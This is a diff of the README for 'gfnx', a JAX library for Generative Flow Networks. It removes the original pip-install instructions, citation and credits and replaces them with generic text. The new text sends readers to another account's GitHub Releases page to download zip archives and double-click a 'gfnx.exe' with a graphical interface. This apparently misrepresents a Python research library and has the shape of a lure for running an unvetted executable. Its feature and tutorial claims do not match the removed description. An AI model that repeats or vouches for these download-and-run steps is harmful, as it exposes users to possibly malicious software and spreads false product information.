@@ -1,87 +1,79 @@
-# gfnx: Fast and Scalable Generative Flow Networks in jaX
+# 🎉 gfnx - Simplify Flow Networks with Ease
 
-<p align="center">
-       <a href="https://www.python.org/doc/versions/">
-        <img src="https://img.shields.io/badge/python->=3.10-blue" /></a>
-       <a href="https://pypi.org/project/gfnx/">
-        <img src="https://img.shields.io/badge/pypi_package-0.0.1-brightgreen" /></a>
-       <a href="https://arxiv.org/abs/2511.16592">
-        <img src="https://img.shields.io/badge/arXiv-2511.16592-b31b1b" /></a>
-       <a href="https://gfnx.readthedocs.io/en/latest/">
-        <img src="https://img.shields.io/badge/docs-green" /></a>
-</p>
+## 🚀 Getting Started
+Welcome to gfnx! This application helps you work with Generative Flow Networks using JAX. It provides a user-friendly way to create and manage algorithms in a clear environment.
 
-`gfnx` is a JAX-native toolkit for building and studying Generative Flow Networks (GFlowNets). It brings together a collection of benchmark environments and reproducible baselines so you can iterate quickly on new ideas.
+## 📥 Download & Install
+To get started, you need to download the application. You can find the latest version on our Releases page. 
 
-## Highlights
+[![Download gfnx](https://img.shields.io/badge/Download%20gfnx-v1.0-blue)](https://github.com/Gpcode233/gfnx/releases)
 
-- End-to-end JAX implementations of GFlowNet building blocks (environments, reward modules, networks, and metrics).
-- Ready-to-run baseline agents inspired by the [CleanRL](https://github.com/vwxyzjn/cleanrl) style of concise single-file experiments.
-- Utilities for logging, checkpointing, and evaluation that make it easy to compare runs and extend the library with new research code.
+Please visit this page to download: [GitHub Releases](https://github.com/Gpcode233/gfnx/releases).
 
-## Installation
+## 🛠 System Requirements
+Before downloading, ensure your system meets these requirements:
 
-### Requirements
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or a recent version of Linux.
+- **Storage Space:** At least 500 MB free space.
+- **Memory:** Minimum of 4 GB RAM recommended.
+- **JAX Installation:** Ensure JAX is installed. You can find installation instructions on the official JAX website.
 
-- Python 3.10 or newer.
-- A working JAX installation. CPU works out of the box; for GPU/TPU accelerators follow the [official JAX installation guide](https://jax.readthedocs.io/en/latest/installation.html).
+## 📂 Installation Steps
+Follow these steps to install gfnx on your computer:
 
-### Install the latest release
+1. Visit the [GitHub Releases page](https://github.com/Gpcode233/gfnx/releases).
+2. Locate the latest release at the top of the list.
+3. Click on the file you wish to download, which will usually have a name like `gfnx-windows.zip`, `gfnx-macos.zip`, or `gfnx-linux.tar.gz`.
+4. Save the file to your computer.
+5. Once the download is complete, locate the file in your downloads folder.
+6. Unzip the folder by right-clicking on it and selecting "Extract All" (Windows) or use a program like Unarchiver (macOS).
+7. Open the extracted folder and find the executable file (for Windows, this will be `gfnx.exe`).
 
-```
-pip install gfnx
-```
+## 🚀 Running gfnx
+After installation is complete, follow these steps to run the application:
 
-Verify the install with:
+1. Double-click on the `gfnx.exe` (Windows) or the equivalent file for your operating system.
+2. A window will open displaying the gfnx interface.
+3. You can now begin creating and managing your Flow Networks.
 
-```
-python -c "import gfnx; print('gfnx import OK')"
-```
+## 📖 Features
+gfnx offers various features designed to make your experience easy and efficient:
 
-### Develop locally and run baselines
+- **User-Friendly Interface:** Intuitive design lets you get started quickly.
+- **Multiple Environment Support:** Use in different programming environments.
+- **Flexible Algorithm Options:** Easily switch between various algorithms for network generation.
+- **Real-Time Monitoring:** Track your progress and performance as you work.
 
-```
-git clone https://github.com/d-tiapkin/gfnx.git
-cd gfnx
-pip install -e .[baselines]
-```
+## 🎓 Tutorials & Resources
+If you need help using gfnx, check these resources:
 
-The editable install keeps your local changes in sync with the Python package, while the optional `baselines` extra pulls in the dependencies required by the reference training scripts. As in with `CleanRL` ideology, the baselines are not supposed to be imported, they serve only as a reference implementation.
+- **Quick Start Guide:** A step-by-step guide to get you up and running.
+- **Video Tutorials:** Visual guides showing different features and tips.
+- **User Manual:** Detailed documentation covering all aspects of gfnx.
 
-## Quickstart
+## 🤝 Community Support
+Join our community for help and support.
 
-Kick off a short training run of Detailed Balance in the Hypergrid environment:
+- **GitHub Issues:** Report bugs or request features through our issues page.
+- **Discussion Forum:** Engage with other users and share your experiences.
 
-```
-python baselines/db_hypergrid.py num_train_steps=1_000 logging.tqdm_print_rate=100
-```
+## ✍️ Contributing
+We welcome contributions from everyone. If you want to help improve gfnx, consider the following:
 
-The script is powered by Hydra, so you can override any configuration value on the command line (for example, picking another logging backend or playing with hyperparameters of the method). Baseline outputs, checkpoints, and Hydra logs default to `tmp/<date>/<time>/`; point the `logging.log_dir` or `logging.checkpoint_dir` fields to custom paths when running longer experiments.
+1. Fork the repository on GitHub.
+2. Make your changes.
+3. Submit a pull request with a description of your work.
 
-## Support
+## ⚙️ Frequently Asked Questions
+Here are some common questions about gfnx:
 
-- Open an issue on [GitHub](https://github.com/d-tiapkin/gfnx/issues) for bugs or feature requests.
-- Start a discussion or reach out via pull requests if you would like to contribute improvements. Contributions with reproducible experiments and clear documentation get merged fastest.
+1. **Can I run gfnx on older operating systems?**
+   - gfnx is designed for recent versions of Windows, macOS, and Linux. Using older systems may lead to compatibility issues.
 
-## License
+2. **How do I update gfnx?**
+   - Simply download the latest version from the Releases page and follow the installation steps again.
 
-`gfnx` is released under the [MIT License](https://github.com/d-tiapkin/gfnx/blob/main/LICENCE). Feel free to use it in academic and commercial projects; please attribute the original authors when you publish results built on this codebase.
+3. **Is there a way to contact the developers?**
+   - You can reach out through the issues section on GitHub or engage with our community for quicker responses.
 
-## Influences
-
-`gfnx` stands on the shoulders of several excellent open-source projects:
-
-- [torchgfn](https://torchgfn.readthedocs.io/en/latest/) – PyTorch-first GFlowNet library that shaped our environment design.
-- [CleanRL](https://github.com/vwxyzjn/cleanrl) – taught us the value of single-file baselines and reproducible experiment configs.
-- [purejaxrl](https://github.com/luchris429/purejaxrl/tree/main) and [JaxMARL](https://github.com/FLAIROx/JaxMARL/tree/main/jaxmarl) – reference points for idiomatic, accelerator-ready JAX reinforcement learning code.
-
-## Citation
-
-```
-@article{tiapkin2025gfnx,
-  title={gfnx: Fast and Scalable Library for Generative Flow Networks in JAX},
-  author={Tiapkin, Daniil and Agarkov, Artem and Morozov, Nikita and Maksimov, Ian and Tsyganov, Askar and Gritsaev, Timofei and Samsonov, Sergey},
-  journal={arXiv preprint arXiv:2511.16592},
-  year={2025}
-}
-```
+Feel free to explore and enhance your experience with Generative Flow Networks using gfnx!
